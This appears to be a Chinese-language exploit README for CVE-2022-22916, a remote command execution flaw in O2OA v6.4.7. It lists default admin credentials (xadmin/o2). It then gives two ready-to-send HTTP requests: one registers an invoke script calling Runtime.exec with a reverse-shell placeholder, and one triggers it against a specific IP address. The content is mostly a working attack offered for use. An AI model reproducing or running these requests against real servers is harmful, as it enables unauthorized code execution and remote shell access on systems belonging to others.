# CVE-2022-22916
CVE-2022-22916,O2OA RCE 远程命令执行
## O2OA RCE 远程命令执行（CVE-2022-22916）

O2OA是一个基于J2EE分布式架构，集成移动办公、智能办公，支持私有化部署，自适应负载能力的，能够很大程度上节约企业软件开发成本的基于AGPL协议开放源代码的企业信息化系统需求定制开发平台解决方案。 通过 /x_program_center/jaxrs/invoke 发现 O2OA v6.4.7 包含一个远程代码执行 (RCE) 漏洞。

# 第一步：
登录账号 xadmin/o2
获取Authorization

# 第二步：添加接口

```
POST /x_program_center/jaxrs/invoke?v=6.3 HTTP/1.1
Host: 123.58.236.76:33455
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Authorization: 你的Authorization
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 475

{"name":"aodsec","id":"aodsec","alias":"","description":"","isNewInvoke":true,"text":"\nvar p = java.lang.Runtime.getRuntime().exec('反弹shell命令');\nvar sc = new java.util.Scanner(p.getInputStream(),\"GBK\").useDelimiter(\"\\\\A\");\nvar result = sc.hasNext() ? sc.next() : \"\";\nsc.close();","enableToken":false,"enable":true,"remoteAddrRegex":"","lastStartTime":"","lastEndTime":"","validated":true}
```

# 第二步：执行命令


```
POST /x_program_center/jaxrs/invoke/aodsec/execute?v=6.3 HTTP/1.1
Host: 123.58.236.76:43953
Content-Length: 0
Accept: text/html,application/json,*/*
X-Requested-With: XMLHttpRequest
Accept-Language: zh-CN
Authorization: 你的Authorization
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Content-Type: application/json; charset=UTF-8
Origin: http://123.58.236.76:43953
Referer: http://123.58.236.76:43953/x_desktop/index.html
Accept-Encoding: gzip, deflate
Cookie:  
Connection: close
```
